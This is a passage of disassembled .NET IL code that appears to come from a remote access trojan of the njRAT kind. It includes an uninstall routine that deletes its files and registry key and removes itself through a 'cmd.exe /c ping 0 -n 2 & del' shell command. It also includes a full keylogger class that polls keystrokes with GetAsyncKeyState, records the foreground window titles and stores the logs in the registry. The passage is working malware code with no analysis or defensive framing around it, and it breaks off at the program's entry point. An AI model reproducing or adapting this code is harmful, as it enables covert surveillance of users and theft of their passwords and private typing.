      IL_0136:  ldstr      ".exe"
      IL_013b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0140:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0145:  leave.s    IL_0162

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0147:  dup
      IL_0148:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014d:  stloc.s    V_4
      IL_014f:  ldloc.s    V_4
      IL_0151:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0156:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_015b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0160:  leave.s    IL_0162

    }  // end handler
    IL_0162:  nop
    .try
    {
      IL_0163:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0168:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_016d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0172:  ldstr      "Software"
      IL_0177:  ldc.i4.1
      IL_0178:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_017d:  ldsfld     string j.OK::RG
      IL_0182:  ldc.i4.0
      IL_0183:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_0188:  leave.s    IL_01a5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_018a:  dup
      IL_018b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0190:  stloc.s    V_5
      IL_0192:  ldloc.s    V_5
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0199:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_019e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01a3:  leave.s    IL_01a5

    }  // end handler
    IL_01a5:  nop
    .try
    {
      IL_01a6:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_01ab:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01b0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01b5:  ldstr      "\""
      IL_01ba:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01bf:  ldc.i4.0
      IL_01c0:  ldc.i4.0
      IL_01c1:  ldc.i4.m1
      IL_01c2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01c7:  pop
      IL_01c8:  leave.s    IL_01e5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ca:  dup
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d0:  stloc.s    V_6
      IL_01d2:  ldloc.s    V_6
      IL_01d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e3:  leave.s    IL_01e5

    }  // end handler
    IL_01e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01ea:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [System]System.IO.Compression.GZipStream V_1,
             uint8[] V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.1
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.2
    IL_0016:  ldloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.0
    IL_0026:  ldloc.2
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.2
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.3
    IL_0037:  ldloc.0
    IL_0038:  ldc.i4.0
    IL_0039:  conv.i8
    IL_003a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_003f:  ldloc.3
    IL_0040:  ldc.i4.1
    IL_0041:  sub.ovf
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_4
    IL_004f:  ldloc.1
    IL_0050:  ldloc.s    V_4
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.3
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.1
    IL_005b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0060:  ldloc.0
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  ldloc.s    V_4
    IL_0068:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       216 (0xd8)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             valuetype [mscorlib]System.DateTime V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brtrue.s   IL_00b3

      IL_004c:  ldarg.0
      IL_004d:  ldloca.s   V_2
      IL_004f:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0054:  stfld      int32 j.kl::LastAV
      IL_0059:  ldarg.0
      IL_005a:  ldloc.3
      IL_005b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0060:  stfld      string j.kl::LastAS
      IL_0065:  ldc.i4.6
      IL_0066:  newarr     [mscorlib]System.String
      IL_006b:  dup
      IL_006c:  ldc.i4.0
      IL_006d:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0072:  stelem.ref
      IL_0073:  dup
      IL_0074:  ldc.i4.1
      IL_0075:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_007a:  stloc.s    V_4
      IL_007c:  ldloca.s   V_4
      IL_007e:  ldstr      "yy/MM/dd "
      IL_0083:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0088:  stelem.ref
      IL_0089:  dup
      IL_008a:  ldc.i4.2
      IL_008b:  ldloc.3
      IL_008c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.3
      IL_0094:  ldstr      " "
      IL_0099:  stelem.ref
      IL_009a:  dup
      IL_009b:  ldc.i4.4
      IL_009c:  ldarg.0
      IL_009d:  ldfld      string j.kl::LastAS
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.5
      IL_00a5:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00aa:  stelem.ref
      IL_00ab:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b0:  stloc.0
      IL_00b1:  leave.s    IL_00d6

      IL_00b3:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_5
      IL_00bd:  ldloc.s    V_5
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldstr      ""
    IL_00d5:  stloc.0
    IL_00d6:  ldloc.0
    IL_00d7:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       380 (0x17c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             bool V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             class [mscorlib]System.Exception V_4,
             char V_5)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.2
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.2
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.2
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.2
    IL_002a:  nop
    .try
    {
      IL_002b:  ldarg.1
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  ldc.i4.s   35
      IL_0030:  bgt.s      IL_0066

      IL_0032:  ldloc.3
      IL_0033:  ldc.i4.s   13
      IL_0035:  bgt.s      IL_0050

      IL_0037:  ldloc.3
      IL_0038:  ldc.i4.8
      IL_0039:  beq.s      IL_00a1

      IL_003b:  ldloc.3
      IL_003c:  ldc.i4.s   9
      IL_003e:  beq        IL_00fe

      IL_0043:  ldloc.3
      IL_0044:  ldc.i4.s   13
      IL_0046:  beq        IL_00d9

      IL_004b:  br         IL_0106

      IL_0050:  ldloc.3
      IL_0051:  ldc.i4.s   16
      IL_0053:  sub
      IL_0054:  ldc.i4.1
      IL_0055:  ble.un.s   IL_00c3

      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.s   32
      IL_005a:  beq.s      IL_00ce

      IL_005c:  ldloc.3
      IL_005d:  ldc.i4.s   35
      IL_005f:  beq.s      IL_00c3

      IL_0061:  br         IL_0106

      IL_0066:  ldloc.3
      IL_0067:  ldc.i4     0xa3
      IL_006c:  bgt.s      IL_0087

      IL_006e:  ldloc.3
      IL_006f:  ldc.i4.s   46
      IL_0071:  beq.s      IL_00a1

      IL_0073:  ldloc.3
      IL_0074:  ldc.i4.s   112
      IL_0076:  sub
      IL_0077:  ldc.i4.s   11
      IL_0079:  ble.un.s   IL_00c3

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4     0xa0
      IL_0081:  sub
      IL_0082:  ldc.i4.3
      IL_0083:  ble.un.s   IL_00c3

      IL_0085:  br.s       IL_0106

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0x10000
      IL_008d:  beq.s      IL_00c3

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x20000
      IL_0095:  beq.s      IL_00c3

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4     0x40000
      IL_009d:  beq.s      IL_00c3

      IL_009f:  br.s       IL_0106

      IL_00a1:  ldstr      "["
      IL_00a6:  ldarga.s   k
      IL_00a8:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00ae:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00b3:  ldstr      "]"
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  stloc.0
      IL_00be:  leave      IL_017a

      IL_00c3:  ldstr      ""
      IL_00c8:  stloc.0
      IL_00c9:  leave      IL_017a

      IL_00ce:  ldstr      " "
      IL_00d3:  stloc.0
      IL_00d4:  leave      IL_017a

      IL_00d9:  ldarg.0
      IL_00da:  ldfld      string j.kl::Logs
      IL_00df:  ldstr      "[ENTER]\r\n"
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_00e9:  brfalse.s  IL_00f6

      IL_00eb:  ldstr      ""
      IL_00f0:  stloc.0
      IL_00f1:  leave      IL_017a

      IL_00f6:  ldstr      "[ENTER]\r\n"
      IL_00fb:  stloc.0
      IL_00fc:  leave.s    IL_017a

      IL_00fe:  ldstr      "[TAP]\r\n"
      IL_0103:  stloc.0
      IL_0104:  leave.s    IL_017a

      IL_0106:  ldloc.2
      IL_0107:  brfalse.s  IL_0118

      IL_0109:  ldarg.1
      IL_010a:  conv.ovf.u4
      IL_010b:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0110:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0115:  stloc.0
      IL_0116:  leave.s    IL_017a

      IL_0118:  ldarg.1
      IL_0119:  conv.ovf.u4
      IL_011a:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_011f:  stloc.1
      IL_0120:  leave.s    IL_0178

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0122:  dup
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0128:  stloc.s    V_4
      IL_012a:  ldloc.s    V_4
      IL_012c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0131:  ldloc.2
      IL_0132:  brfalse.s  IL_0157

      IL_0134:  ldarg.1
      IL_0135:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_013a:  stloc.s    V_5
      IL_013c:  ldloca.s   V_5
      IL_013e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0143:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0148:  stloc.1
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014e:  ldloc.1
      IL_014f:  stloc.0
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  leave.s    IL_017a

      IL_0157:  ldarg.1
      IL_0158:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_015d:  stloc.s    V_5
      IL_015f:  ldloca.s   V_5
      IL_0161:  call       instance string [mscorlib]System.Char::ToString()
      IL_0166:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_016b:  stloc.1
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0176:  leave.s    IL_0178

    }  // end handler
    IL_0178:  ldloc.1
    IL_0179:  stloc.0
    IL_017a:  ldloc.0
    IL_017b:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  7
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             uint8[] V_2,
             uint32 V_3,
             int32 V_4,
             native int V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_7)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  ldc.i4     0xff
      IL_000b:  newarr     [mscorlib]System.Byte
      IL_0010:  stloc.2
      IL_0011:  ldloc.2
      IL_0012:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0017:  brtrue.s   IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0088

      IL_0021:  ldarg.0
      IL_0022:  ldc.i4.0
      IL_0023:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0028:  stloc.3
      IL_0029:  ldc.i4.0
      IL_002a:  stloc.s    V_4
      IL_002c:  call       native int j.OK::GetForegroundWindow()
      IL_0031:  ldloca.s   V_4
      IL_0033:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0038:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_003d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0042:  stloc.s    V_5
      IL_0044:  ldarg.0
      IL_0045:  ldloc.3
      IL_0046:  ldloc.2
      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.5
      IL_0049:  ldc.i4.0
      IL_004a:  ldloc.s    V_5
      IL_004c:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_0051:  pop
      IL_0052:  ldloc.1
      IL_0053:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0058:  stloc.0
      IL_0059:  leave.s    IL_0088

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  dup
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldloc.s    V_6
      IL_0065:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldarg.0
    IL_0077:  conv.ovf.i4.un
    IL_0078:  stloc.s    V_7
    IL_007a:  ldloca.s   V_7
    IL_007c:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0082:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0087:  stloc.0
    IL_0088:  ldloc.0
    IL_0089:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                          object)
    IL_0011:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0016:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001b:  stfld      string j.kl::Logs
    .try
    {
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  ldloc.1
      IL_0029:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_002e:  ldc.i4     0xffff8001
      IL_0033:  ceq
      IL_0035:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_003a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003f:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0044:  ldc.i4.0
      IL_0045:  ceq
      IL_0047:  and
      IL_0048:  brfalse.s  IL_008d

      IL_004a:  ldloc.1
      IL_004b:  stloc.2
      IL_004c:  ldarg.0
      IL_004d:  ldloc.2
      IL_004e:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0053:  stloc.3
      IL_0054:  ldloc.3
      IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005a:  ldc.i4.0
      IL_005b:  ble.s      IL_0086

      IL_005d:  ldarg.0
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string j.kl::Logs
      IL_0064:  ldarg.0
      IL_0065:  call       instance string j.kl::AV()
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006f:  stfld      string j.kl::Logs
      IL_0074:  ldarg.0
      IL_0075:  ldarg.0
      IL_0076:  ldfld      string j.kl::Logs
      IL_007b:  ldloc.3
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldloc.2
      IL_0088:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_008d:  ldloc.1
      IL_008e:  ldc.i4.1
      IL_008f:  add.ovf
      IL_0090:  stloc.1
      IL_0091:  ldloc.1
      IL_0092:  ldc.i4     0xff
      IL_0097:  ble.s      IL_0028

      IL_0099:  ldloc.0
      IL_009a:  ldc.i4     0x3e8
      IL_009f:  bne.un.s   IL_00f7

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  ldstr      "[klen]"
      IL_00a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00ad:  ldc.i4     0x400
      IL_00b2:  mul.ovf
      IL_00b3:  stloc.s    V_4
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string j.kl::Logs
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  ble.s      IL_00e4

      IL_00c4:  ldarg.0
      IL_00c5:  ldarg.0
      IL_00c6:  ldfld      string j.kl::Logs
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldarg.0
      IL_00cd:  ldfld      string j.kl::Logs
      IL_00d2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d7:  ldloc.s    V_4
      IL_00d9:  sub.ovf
      IL_00da:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00df:  stfld      string j.kl::Logs
      IL_00e4:  ldarg.0
      IL_00e5:  ldfld      string j.kl::vn
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string j.kl::Logs
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f6:  pop
      IL_00f7:  ldc.i4.1
      IL_00f8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00fd:  br         IL_0022

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_5
      IL_010a:  ldloc.s    V_5
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011b:  leave.s    IL_011d

    }  // end handler
    IL_011d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
